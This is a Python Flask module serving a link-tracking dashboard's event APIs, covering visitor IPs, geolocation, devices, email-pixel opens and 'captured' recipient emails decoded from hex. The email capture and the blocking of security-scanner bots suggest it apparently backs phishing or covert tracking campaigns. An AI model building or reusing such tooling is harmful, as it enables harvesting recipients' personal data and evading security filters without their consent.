"""
events.py — Tracking event retrieval, live feed, and event management.
Pixel tracking is handled by track.py — no duplicate here.
"""
import re
import logging
from datetime import datetime, timedelta
from flask import Blueprint, request, jsonify, session
from api.database import db
from api.models.tracking_event import TrackingEvent
from api.models.link import Link
from api.models.user import User
from api.middleware.auth_decorators import login_required

logger = logging.getLogger(__name__)
events_bp = Blueprint("events", __name__)


def _decode_hex_email(hex_email):
    try:
        if hex_email.startswith('0x'):
            hex_email = hex_email[2:]
        return bytes.fromhex(hex_email).decode('utf-8')
    except Exception:
        return hex_email  # Return as-is if not hex


def _get_detailed_status(event):
    if event.is_bot:
        return "Bot detected and blocked by security filters"
    if event.blocked_reason:
        return f"Access blocked: {event.blocked_reason}"
    if event.on_page:
        return "User landed on target page and is actively browsing"
    if event.redirected or event.status == "redirected":
        return "User clicked link and was successfully redirected"
    if event.email_opened:
        return "Email tracking pixel loaded successfully"
    return "Tracking event processed"


def _display_status(event):
    parts = []
    if event.email_opened:
        parts.append("Open")
    if event.redirected or event.status == "redirected":
        parts.append("Redirected")
    if event.on_page:
        parts.append("On Page")
    if parts:
        return " → ".join(parts)
    if event.is_bot:
        return "Bot"
    if event.blocked_reason:
        return "Blocked"
    return event.status or "Open"


def _format_event(event, short_code, link=None):
    """Standard event formatting used across all get endpoints"""
    ts = event.timestamp.strftime("%Y-%m-%d %H:%M:%S") if event.timestamp else "Unknown"

    loc_parts = [p for p in [event.city, event.region, event.zip_code, event.country]
                 if p and p != "Unknown"]
    location = ", ".join(loc_parts) if loc_parts else "Unknown Location"

    browser_info = event.browser or "Unknown"
    if event.browser_version:
        browser_info += f" {event.browser_version}"
    os_info = event.os or "Unknown"
    if event.os_version:
        os_info += f" {event.os_version}"

    session_duration = "00:00:00"
    if event.session_duration:
        m, s = divmod(event.session_duration, 60)
        h, m = divmod(m, 60)
        session_duration = f"{h:02d}:{m:02d}:{s:02d}"

    decoded_email = event.captured_email
    if decoded_email and re.match(r'^[0-9a-fA-F]+$', decoded_email):
        decoded_email = _decode_hex_email(decoded_email)

    return {
        "id": event.id,
        "uniqueId": event.unique_id or f"uid_{short_code}_{event.id:03d}",
        "timestamp": ts,
        "ip": event.ip_address or "Unknown",
        "location": location,
        "country": event.country or "Unknown",
        "region": event.region or "Unknown",
        "city": event.city or "Unknown",
        "zipCode": event.zip_code or "Unknown",
        "userAgent": event.user_agent or "Unknown",
        "browser": browser_info,
        "os": os_info,
        "device": event.device_type or "Unknown",
        "status": _display_status(event),
        "detailedStatus": _get_detailed_status(event),
        "linkShortCode": short_code or f"link_{event.link_id}",
        "linkId": event.link_id,
        "campaignName": link.campaign_name if link else "Unknown",
        "referrer": event.referrer or "direct",
        "isp": event.isp or "Unknown",
        "ispDetails": event.organization or event.isp or "Unknown ISP",
        "emailCaptured": decoded_email,
        "isBot": event.is_bot or False,
        "threatScore": event.threat_score or 0,
        "sessionDuration": session_duration,
        "latitude": event.latitude,
        "longitude": event.longitude,
        "quantumEnabled": event.quantum_enabled or False,
        "quantumStage": event.quantum_stage,
    }


# ---------- Main events list ----------

@events_bp.route("/api/events", methods=["GET"])
@login_required
def get_events():
    """Get paginated tracking events for user's links"""
    try:
        user_id = session.get("user_id")
        page = request.args.get("page", 1, type=int)
        per_page = request.args.get("per_page", 50, type=int)
        link_id_filter = request.args.get("link_id", type=int)
        status_filter = request.args.get("status", type=str)
        search = request.args.get("search", type=str)

        query = (db.session.query(TrackingEvent, Link)
                 .join(Link)
                 .filter(Link.user_id == user_id))

        if link_id_filter:
            query = query.filter(TrackingEvent.link_id == link_id_filter)
        if status_filter:
            query = query.filter(TrackingEvent.status == status_filter)
        if search:
            pat = f"%{search}%"
            query = query.filter(
                (TrackingEvent.ip_address.ilike(pat)) |
                (TrackingEvent.country.ilike(pat)) |
                (TrackingEvent.city.ilike(pat)) |
                (TrackingEvent.captured_email.ilike(pat)) |
                (TrackingEvent.user_agent.ilike(pat))
            )

        pagination = query.order_by(TrackingEvent.timestamp.desc()).paginate(
            page=page, per_page=per_page, error_out=False
        )

        events_list = [
            _format_event(event, link.short_code, link)
            for event, link in pagination.items
        ]

        return jsonify({
            "success": True,
            "events": events_list,
            "total": pagination.total,
            "pages": pagination.pages,
            "current_page": page
        }), 200

    except Exception as e:
        logger.error(f"get_events error: {e}")
        return jsonify({"success": False, "error": str(e)}), 500


# ---------- Live / recent events ----------

@events_bp.route("/api/events/live", methods=["GET"])
@login_required
def get_live_events():
    try:
        user_id = session.get("user_id")
        limit = request.args.get("limit", 20, type=int)

        rows = (db.session.query(TrackingEvent, Link)
                .join(Link)
                .filter(Link.user_id == user_id)
                .order_by(TrackingEvent.timestamp.desc())
                .limit(limit)
                .all())

        return jsonify({
            "success": True,
            "events": [_format_event(ev, link.short_code, link) for ev, link in rows]
        }), 200

    except Exception as e:
        logger.error(f"get_live_events error: {e}")
        return jsonify({"success": False, "error": str(e)}), 500


# ---------- Single event detail ----------

@events_bp.route("/api/events/<int:event_id>", methods=["GET"])
@login_required
def get_event_detail(event_id):
    user_id = session.get("user_id")
    row = (db.session.query(TrackingEvent, Link)
           .join(Link)
           .filter(TrackingEvent.id == event_id, Link.user_id == user_id)
           .first())
    if not row:
        return jsonify({"success": False, "error": "Event not found"}), 404
    event, link = row
    return jsonify({"success": True, "event": _format_event(event, link.short_code, link)}), 200


# ---------- Delete event ----------

@events_bp.route("/api/events/<int:event_id>", methods=["DELETE"])
@login_required
def delete_event(event_id):
    user_id = session.get("user_id")
    row = (db.session.query(TrackingEvent, Link)
           .join(Link)
           .filter(TrackingEvent.id == event_id, Link.user_id == user_id)
           .first())
    if not row:
        return jsonify({"success": False, "error": "Event not found"}), 404
    db.session.delete(row[0])
    db.session.commit()
    return jsonify({"success": True, "message": "Event deleted"}), 200


# ---------- Captured emails ----------

@events_bp.route("/api/events/emails", methods=["GET"])
@login_required
def get_captured_emails():
    """List all captured emails across user's links"""
    user_id = session.get("user_id")
    page = request.args.get("page", 1, type=int)
    per_page = request.args.get("per_page", 50, type=int)

    query = (db.session.query(TrackingEvent, Link)
             .join(Link)
             .filter(Link.user_id == user_id, TrackingEvent.captured_email.isnot(None))
             .order_by(TrackingEvent.timestamp.desc()))

    pagination = query.paginate(page=page, per_page=per_page, error_out=False)

    emails = []
    for event, link in pagination.items:
        decoded = event.captured_email
        if decoded and re.match(r'^[0-9a-fA-F]+$', decoded):
            decoded = _decode_hex_email(decoded)
        emails.append({
            "id": event.id,
            "email": decoded,
            "link_id": link.id,
            "campaign_name": link.campaign_name,
            "country": event.country or "Unknown",
            "city": event.city or "Unknown",
            "timestamp": event.timestamp.isoformat() if event.timestamp else None,
            "ip": event.ip_address,
            "device": event.device_type,
        })

    return jsonify({
        "success": True,
        "emails": emails,
        "total": pagination.total,
        "pages": pagination.pages,
        "page": page
    }), 200


# ---------- Event stats summary ----------

@events_bp.route("/api/events/stats", methods=["GET"])
@login_required
def get_event_stats():
    """Quick statistics for current user's events"""
    user_id = session.get("user_id")
    link_ids = [l.id for l in Link.query.filter_by(user_id=user_id).with_entities(Link.id).all()]

    if not link_ids:
        return jsonify({
            "success": True,
            "total_events": 0, "unique_visitors": 0,
            "bots_blocked": 0, "emails_captured": 0
        }), 200

    from sqlalchemy import func

    total = TrackingEvent.query.filter(TrackingEvent.link_id.in_(link_ids)).count()
    unique = db.session.query(func.count(func.distinct(TrackingEvent.ip_address)))\
        .filter(TrackingEvent.link_id.in_(link_ids)).scalar() or 0
    bots = TrackingEvent.query.filter(
        TrackingEvent.link_id.in_(link_ids), TrackingEvent.is_bot == True
    ).count()
    emails = TrackingEvent.query.filter(
        TrackingEvent.link_id.in_(link_ids), TrackingEvent.captured_email.isnot(None)
    ).count()

    return jsonify({
        "success": True,
        "total_events": total,
        "unique_visitors": unique,
        "bots_blocked": bots,
        "emails_captured": emails
    }), 200
